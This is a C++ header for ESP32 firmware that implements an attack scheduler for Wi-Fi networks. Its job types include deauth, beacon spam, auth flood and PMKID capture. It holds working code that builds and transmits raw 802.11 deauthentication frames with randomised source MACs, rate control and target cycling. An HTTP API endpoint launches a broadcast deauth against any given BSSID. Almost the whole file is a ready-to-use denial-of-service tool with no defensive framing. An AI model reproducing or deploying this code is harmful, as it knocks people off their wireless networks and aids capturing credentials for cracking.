#pragma once
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>
#include <stdint.h>

// ── Attack Scheduler ──────────────────────────────────────────────────────────
//
// Schedules and manages attack sequences with configurable timing,
// channel switching, target cycling, and rate limiting.
// Provides autonomous attack orchestration for multi-step operations.

#define AS_MAX_JOBS 16
#define AS_MAX_TARGETS 8
#define AS_MAX_STEPS 32
#define AS_MAX_LOG 64

// ── Attack job type ───────────────────────────────────────────────────────────
enum AsJobType : uint8_t {
  AS_JOB_DEAUTH = 0,
  AS_JOB_DISASSOC = 1,
  AS_JOB_PROBE_FLOOD = 2,
  AS_JOB_BEACON_SPAM = 3,
  AS_JOB_AUTH_FLOOD = 4,
  AS_JOB_CHAN_HOP = 5,
  AS_JOB_SCAN = 6,
  AS_JOB_HANDSHAKE = 7,
  AS_JOB_PMKID = 8,
  AS_JOB_BTM_REQ = 9,
  AS_JOB_SA_QUERY = 10,
  AS_JOB_EAPOL = 11,
  AS_JOB_NULL_FLOOD = 12,
  AS_JOB_NAV_FLOOD = 13,
  AS_JOB_CUSTOM_FRAME = 14,
};

static const char *as_job_type_name(AsJobType t) {
  switch (t) {
    case AS_JOB_DEAUTH:
      return "deauth";
    case AS_JOB_DISASSOC:
      return "disassoc";
    case AS_JOB_PROBE_FLOOD:
      return "probe_flood";
    case AS_JOB_BEACON_SPAM:
      return "beacon_spam";
    case AS_JOB_AUTH_FLOOD:
      return "auth_flood";
    case AS_JOB_CHAN_HOP:
      return "chan_hop";
    case AS_JOB_SCAN:
      return "scan";
    case AS_JOB_HANDSHAKE:
      return "handshake";
    case AS_JOB_PMKID:
      return "pmkid";
    case AS_JOB_BTM_REQ:
      return "btm_req";
    case AS_JOB_SA_QUERY:
      return "sa_query";
    case AS_JOB_EAPOL:
      return "eapol";
    case AS_JOB_NULL_FLOOD:
      return "null_flood";
    case AS_JOB_NAV_FLOOD:
      return "nav_flood";
    case AS_JOB_CUSTOM_FRAME:
      return "custom";
    default:
      return "unknown";
  }
}

// ── Job state ─────────────────────────────────────────────────────────────────
enum AsJobState : uint8_t {
  AS_STATE_PENDING = 0,
  AS_STATE_ACTIVE = 1,
  AS_STATE_PAUSED = 2,
  AS_STATE_DONE = 3,
  AS_STATE_FAILED = 4,
  AS_STATE_CANCELLED = 5,
};

// ── Target entry ─────────────────────────────────────────────────────────────
struct AsTarget {
  uint8_t bssid[6];
  uint8_t sta_mac[6];  // 00:00:00:00:00:00 = broadcast
  uint8_t channel;
  char ssid[33];
};

// ── Attack job ────────────────────────────────────────────────────────────────
struct AsJob {
  uint32_t id;
  AsJobType type;
  AsJobState state;
  AsTarget targets[AS_MAX_TARGETS];
  uint8_t target_count;
  uint8_t current_target;
  uint32_t rate_pps;     // packets per second
  uint32_t duration_ms;  // 0 = run until cancelled
  uint32_t start_ms;
  uint32_t last_tx_ms;
  uint32_t packets_sent;
  uint32_t packets_failed;
  uint16_t reason_code;  // for deauth/disassoc
  bool cycle_targets;    // rotate through targets
  bool randomize_src;    // random source MAC
  uint8_t repeat_count;  // 0 = infinite
  uint8_t done_count;
  char note[32];
};

// ── Log entry ─────────────────────────────────────────────────────────────────
struct AsLog {
  uint32_t ts_ms;
  uint32_t job_id;
  char message[64];
};

// ── Scheduler state ───────────────────────────────────────────────────────────
struct AsState {
  AsJob jobs[AS_MAX_JOBS];
  uint8_t job_count;
  uint32_t next_id;
  AsLog log[AS_MAX_LOG];
  uint8_t log_head;
  uint8_t log_count;
  uint32_t total_packets;
  bool emergency_stop;
};

static AsState g_as = {};

// ── Log push ──────────────────────────────────────────────────────────────────
static void as_log(uint32_t job_id, const char *msg) {
  AsLog *l = &g_as.log[g_as.log_head];
  l->ts_ms = millis();
  l->job_id = job_id;
  strncpy(l->message, msg ? msg : "", 63);
  l->message[63] = 0;
  g_as.log_head = (g_as.log_head + 1) % AS_MAX_LOG;
  if (g_as.log_count < AS_MAX_LOG)
    g_as.log_count++;
}

// ── Job by ID ─────────────────────────────────────────────────────────────────
static AsJob *as_find_job(uint32_t id) {
  for (uint8_t i = 0; i < g_as.job_count; i++) {
    if (g_as.jobs[i].id == id)
      return &g_as.jobs[i];
  }
  return nullptr;
}

// ── Add target to job ─────────────────────────────────────────────────────────
static bool as_add_target(AsJob *job, const uint8_t bssid[6], const uint8_t sta[6], uint8_t ch,
                          const char *ssid) {
  if (job->target_count >= AS_MAX_TARGETS)
    return false;
  AsTarget &t = job->targets[job->target_count++];
  memcpy(t.bssid, bssid, 6);
  if (sta)
    memcpy(t.sta_mac, sta, 6);
  else
    memset(t.sta_mac, 0xFF, 6);
  t.channel = ch;
  if (ssid) {
    strncpy(t.ssid, ssid, 32);
    t.ssid[32] = 0;
  }
  return true;
}

// ── Create job ────────────────────────────────────────────────────────────────
static AsJob *as_create_job(AsJobType type, uint32_t rate_pps, uint32_t duration_ms,
                            uint16_t reason) {
  if (g_as.job_count >= AS_MAX_JOBS)
    return nullptr;
  AsJob *j = &g_as.jobs[g_as.job_count++];
  memset(j, 0, sizeof(*j));
  j->id = g_as.next_id++;
  j->type = type;
  j->state = AS_STATE_PENDING;
  j->rate_pps = rate_pps ? rate_pps : 10;
  j->duration_ms = duration_ms;
  j->reason_code = reason ? reason : 3;
  j->cycle_targets = true;
  return j;
}

// ── Cancel job ────────────────────────────────────────────────────────────────
static void as_cancel_job(uint32_t id) {
  AsJob *j = as_find_job(id);
  if (j && j->state != AS_STATE_DONE)
    j->state = AS_STATE_CANCELLED;
}

// ── Pause/resume ──────────────────────────────────────────────────────────────
static void as_pause_job(uint32_t id) {
  AsJob *j = as_find_job(id);
  if (j && j->state == AS_STATE_ACTIVE)
    j->state = AS_STATE_PAUSED;
}
static void as_resume_job(uint32_t id) {
  AsJob *j = as_find_job(id);
  if (j && j->state == AS_STATE_PAUSED)
    j->state = AS_STATE_ACTIVE;
}

// ── Random MAC ───────────────────────────────────────────────────────────────
static void as_rand_mac(uint8_t mac[6]) {
  for (int i = 0; i < 6; i++)
    mac[i] = (uint8_t)(esp_random() & 0xFF);
  mac[0] &= 0xFE;
  mac[0] |= 0x02;
}

// ── Execute one deauth tick ───────────────────────────────────────────────────
static bool as_exec_deauth(AsJob *j) {
  if (!j->target_count)
    return false;
  AsTarget &t = j->targets[j->current_target];
  uint8_t src[6];
  if (j->randomize_src)
    as_rand_mac(src);
  else
    memcpy(src, t.bssid, 6);
  // Build deauth frame
  uint8_t buf[26];
  buf[0] = 0xC0;
  buf[1] = 0x00;
  buf[2] = 0x00;
  buf[3] = 0x00;
  memcpy(buf + 4, t.sta_mac, 6);
  memcpy(buf + 10, src, 6);
  memcpy(buf + 16, t.bssid, 6);
  static uint16_t seq = 0;
  buf[22] = (seq >> 4) & 0xFF;
  buf[23] = (uint8_t)((seq << 4) & 0xF0);
  seq++;
  buf[24] = (uint8_t)(j->reason_code & 0xFF);
  buf[25] = (uint8_t)(j->reason_code >> 8);
  esp_err_t r = esp_wifi_80211_tx(WIFI_IF_AP, buf, 26, false);
  if (r == ESP_OK) {
    j->packets_sent++;
    g_as.total_packets++;
    return true;
  }
  j->packets_failed++;
  return false;
}

// ── Scheduler tick ────────────────────────────────────────────────────────────
static void as_tick() {
  if (g_as.emergency_stop)
    return;
  uint32_t now = millis();
  for (uint8_t i = 0; i < g_as.job_count; i++) {
    AsJob *j = &g_as.jobs[i];
    if (j->state == AS_STATE_PENDING) {
      j->state = AS_STATE_ACTIVE;
      j->start_ms = now;
      char msg[64];
      snprintf(msg, sizeof(msg), "Job %u started: %s", j->id, as_job_type_name(j->type));
      as_log(j->id, msg);
    }
    if (j->state != AS_STATE_ACTIVE)
      continue;
    // Check duration
    if (j->duration_ms > 0 && now - j->start_ms >= j->duration_ms) {
      j->state = AS_STATE_DONE;
      char msg[64];
      snprintf(msg, sizeof(msg), "Job %u done: %u pkts", j->id, j->packets_sent);
      as_log(j->id, msg);
      continue;
    }
    // Rate limiting
    uint32_t interval_ms = (j->rate_pps > 0) ? (1000 / j->rate_pps) : 100;
    if (now - j->last_tx_ms < interval_ms)
      continue;
    j->last_tx_ms = now;
    // Execute
    bool ok = false;
    switch (j->type) {
      case AS_JOB_DEAUTH:
      case AS_JOB_DISASSOC:
        ok = as_exec_deauth(j);
        break;
      default:
        break;
    }
    // Cycle targets
    if (j->cycle_targets && j->target_count > 1) {
      j->current_target = (j->current_target + 1) % j->target_count;
    }
  }
}

// ── Emergency stop ────────────────────────────────────────────────────────────
static void as_emergency_stop() {
  g_as.emergency_stop = true;
  for (uint8_t i = 0; i < g_as.job_count; i++) {
    if (g_as.jobs[i].state == AS_STATE_ACTIVE)
      g_as.jobs[i].state = AS_STATE_CANCELLED;
  }
  as_log(0, "EMERGENCY STOP");
}

static void as_clear_stop() {
  g_as.emergency_stop = false;
}

// ── Jobs JSON ─────────────────────────────────────────────────────────────────
static String as_jobs_json() {
  String j = "{\"jobs\":[";
  for (uint8_t i = 0; i < g_as.job_count; i++) {
    if (i)
      j += ",";
    AsJob &jb = g_as.jobs[i];
    j += "{\"id\":" + String(jb.id);
    j += ",\"type\":\"" + String(as_job_type_name(jb.type)) + "\"";
    j += ",\"state\":" + String((int)jb.state);
    j += ",\"targets\":" + String(jb.target_count);
    j += ",\"pps\":" + String(jb.rate_pps);
    j += ",\"duration\":" + String(jb.duration_ms);
    j += ",\"sent\":" + String(jb.packets_sent);
    j += ",\"failed\":" + String(jb.packets_failed);
    uint32_t elapsed = jb.start_ms ? (millis() - jb.start_ms) : 0;
    j += ",\"elapsed_ms\":" + String(elapsed);
    j += "}";
  }
  j += "],\"total_packets\":" + String(g_as.total_packets);
  j += ",\"estop\":" + String(g_as.emergency_stop ? 1 : 0);
  j += "}";
  return j;
}

// ── Log JSON ──────────────────────────────────────────────────────────────────
static String as_log_json(int max_n) {
  if (max_n < 1 || max_n > AS_MAX_LOG)
    max_n = AS_MAX_LOG;
  String j = "{\"count\":" + String(g_as.log_count) + ",\"log\":[";
  int shown = 0;
  int start = (g_as.log_head + AS_MAX_LOG - g_as.log_count) % AS_MAX_LOG;
  for (int i = g_as.log_count - 1; i >= 0 && shown < max_n; i--) {
    int idx = (start + i) % AS_MAX_LOG;
    if (shown)
      j += ",";
    j += "{\"ts\":" + String(g_as.log[idx].ts_ms);
    j += ",\"job\":" + String(g_as.log[idx].job_id);
    j += ",\"msg\":\"";
    j += g_as.log[idx].message;
    j += "\"";
    j += "}";
    shown++;
  }
  j += "]}";
  return j;
}

// ── HTTP routes ───────────────────────────────────────────────────────────────
static void as_routes() {
  extern WebServer server;

  server.on("/api/sched/jobs", HTTP_GET,
            []() { server.send(200, "application/json", as_jobs_json()); });

  server.on("/api/sched/log", HTTP_GET, []() {
    int n = server.hasArg("n") ? server.arg("n").toInt() : 20;
    server.send(200, "application/json", as_log_json(n));
  });

  server.on("/api/sched/estop", HTTP_POST, []() {
    as_emergency_stop();
    server.send(200, "application/json", "{\"ok\":1}");
  });

  server.on("/api/sched/clear_stop", HTTP_POST, []() {
    as_clear_stop();
    server.send(200, "application/json", "{\"ok\":1}");
  });

  server.on("/api/sched/cancel", HTTP_POST, []() {
    if (!server.hasArg("id")) {
      server.send(400, "application/json", "{\"error\":\"id required\"}");
      return;
    }
    uint32_t id = (uint32_t)server.arg("id").toInt();
    as_cancel_job(id);
    server.send(200, "application/json", "{\"ok\":1}");
  });

  server.on("/api/sched/deauth", HTTP_POST, []() {
    // Quick deauth job via API
    if (!server.hasArg("bssid")) {
      server.send(400, "application/json", "{\"error\":\"bssid required\"}");
      return;
    }
    uint8_t bssid[6];
    unsigned b[6];
    if (sscanf(server.arg("bssid").c_str(), "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4],
               &b[5]) != 6) {
      server.send(400, "application/json", "{\"error\":\"invalid bssid\"}");
      return;
    }
    for (int i = 0; i < 6; i++)
      bssid[i] = (uint8_t)b[i];
    uint8_t ch = (uint8_t)(server.hasArg("ch") ? server.arg("ch").toInt() : 6);
    uint32_t dur = (uint32_t)(server.hasArg("dur") ? server.arg("dur").toInt() : 5000);
    uint32_t pps = (uint32_t)(server.hasArg("pps") ? server.arg("pps").toInt() : 10);
    uint16_t reason = (uint16_t)(server.hasArg("reason") ? server.arg("reason").toInt() : 3);
    AsJob *j = as_create_job(AS_JOB_DEAUTH, pps, dur, reason);
    if (!j) {
      server.send(503, "application/json", "{\"error\":\"job queue full\"}");
      return;
    }
    static const uint8_t bcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    as_add_target(j, bssid, bcast, ch, nullptr);
    char buf[32];
    snprintf(buf, sizeof(buf), "{\"job_id\":%u}", (unsigned)j->id);
    server.send(200, "application/json", buf);
  });

  server.on("/api/sched/pause", HTTP_POST, []() {
    if (!server.hasArg("id")) {
      server.send(400, "application/json", "{\"error\":\"id required\"}");
      return;
    }
    as_pause_job((uint32_t)server.arg("id").toInt());
    server.send(200, "application/json", "{\"ok\":1}");
  });

  server.on("/api/sched/resume", HTTP_POST, []() {
    if (!server.hasArg("id")) {
      server.send(400, "application/json", "{\"error\":\"id required\"}");
      return;
    }
    as_resume_job((uint32_t)server.arg("id").toInt());
    server.send(200, "application/json", "{\"ok\":1}");
  });
}
